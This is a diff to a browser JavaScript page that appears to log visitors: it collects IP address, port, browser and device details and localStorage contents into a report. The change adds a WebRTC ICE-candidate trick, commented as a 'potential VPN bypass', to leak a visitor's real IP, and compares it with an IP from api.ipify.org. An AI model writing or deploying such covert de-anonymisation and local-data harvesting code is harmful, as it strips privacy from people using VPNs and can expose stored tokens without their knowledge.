@@ -13,47 +13,62 @@
         // Function to detect VPN usage
         async function detectVPN() {
             try {
-                // Check for known VPN patterns in IP data
-                const vpnCheck1 = await fetch('https://vpnapi.io/api/check?api_key=YOUR_API_KEY');
-                const vpnData1 = await vpnCheck1.json();
+                // Check for VPN indicators
+                const vpnIndicators = [];
                 
-                // Alternative VPN check using IP-API
-                const vpnCheck2 = await fetch('http://ip-api.com/json/');
-                const vpnData2 = await vpnCheck2.json();
+                // Check for known VPN patterns in User-Agent
+                const userAgent = navigator.userAgent.toLowerCase();
+                if (userAgent.includes('vpn') || userAgent.includes('proxy')) {
+                    vpnIndicators.push('User-Agent contains VPN/Proxy keywords');
+                }
                 
                 // Check for suspicious network characteristics
-                const suspiciousIndicators = [];
-                
-                // Check for Tor exit nodes
-                const torCheck = await fetch('https://check.torproject.org/api/ip');
-                const torData = await torCheck.json();
-                if (torData.IsTor) {
-                    suspiciousIndicators.push('Tor Exit Node');
+                if (navigator.connection) {
+                    const conn = navigator.connection;
+                    if (conn.effectiveType === 'slow-2g' || 
+                        conn.downlink < 1 || 
+                        conn.rtt > 500) {
+                        vpnIndicators.push('Slow network connection');
+                    }
                 }
                 
-                // Check for known VPN ranges
-                if (vpnData1.is_vpn || vpnData2.isProxy) {
-                    suspiciousIndicators.push('Known VPN Range');
-                }
+                // Check for WebRTC IP leakage (potential VPN bypass)
+                let webrtcIP = null;
+                try {
+                    const pc = new RTCPeerConnection({
+                        iceServers: []
+                    });
+                    pc.createDataChannel('');
+                    pc.createOffer().then(pc.setLocalDescription.bind(pc));
+                    
+                    // Wait for ICE candidates
+                    await new Promise(resolve => {
+                        pc.onicecandidate = e => {
+                            if (!e.candidate) resolve();
+                        };
+                    });
+                    
+                    // Extract IP from SDP
+                    const sdp = pc.localDescription.sdp;
+                    const ipMatch = sdp.match(/([0-9]{1,3}(?:\.[0-9]{1,3}){3})/);
+                    if (ipMatch) {
+                        webrtcIP = ipMatch[1];
+                    }
+                } catch (e) {}
                 
-                // Check for high packet loss or latency
-                const testLatency = await fetch('https://www.google.com/favicon.ico?_=' + Date.now());
-                const startTime = performance.now();
-                await testLatency.text();
-                const endTime = performance.now();
-                const latency = endTime - startTime;
-                
-                if (latency > 1000) {
-                    suspiciousIndicators.push(`High Latency (${latency.toFixed(2)}ms)`);
-                }
+                // Check for different IPs between services
+                const apiCheck = await fetch('https://api.ipify.org?format=json');
+                const apiData = await apiCheck.json();
                 
                 return {
-                    detected: suspiciousIndicators.length > 0,
-                    indicators: suspiciousIndicators
+                    detected: vpnIndicators.length > 0,
+                    indicators: vpnIndicators,
+                    webrtcIP: webrtcIP,
+                    apiIP: apiData.ip
                 };
             } catch (error) {
                 console.error('VPN detection error:', error);
-                return { detected: false, indicators: [] };
+                return { detected: false, indicators: [], webrtcIP: null, apiIP: null };
             }
         }
 
@@ -95,6 +110,8 @@
                     port: window.location.port || (window.location.protocol === 'https:' ? 443 : 80),
                     vpn: vpnStatus.detected,
                     vpnIndicators: vpnStatus.indicators,
+                    webrtcIP: vpnStatus.webrtcIP,
+                    apiIP: vpnStatus.apiIP,
                     ...browserInfo,
                     deviceInfo,
                     localStorage: localStorageItems,
@@ -118,7 +135,9 @@
 - IP Address: ${info.ip}
 - Port Number: ${info.port}
 - VPN Detected: ${info.vpn ? 'Yes' : 'No'}
-${info.vpn ? `- Indicators: ${info.vpnIndicators.join(', ')}` : ''}
+${info.vpn ? `- VPN Indicators: ${info.vpnIndicators.join(', ')}` : ''}
+${info.vpn && info.webrtcIP ? `- WebRTC IP: ${info.webrtcIP}` : ''}
+${info.vpn && info.apiIP && info.apiIP !== info.ip ? `- Different API IP: ${info.apiIP}` : ''}
 - User Agent: ${info.userAgent.substring(0, 60)}...
 - Platform: ${info.platform}
 - Language: ${info.language}
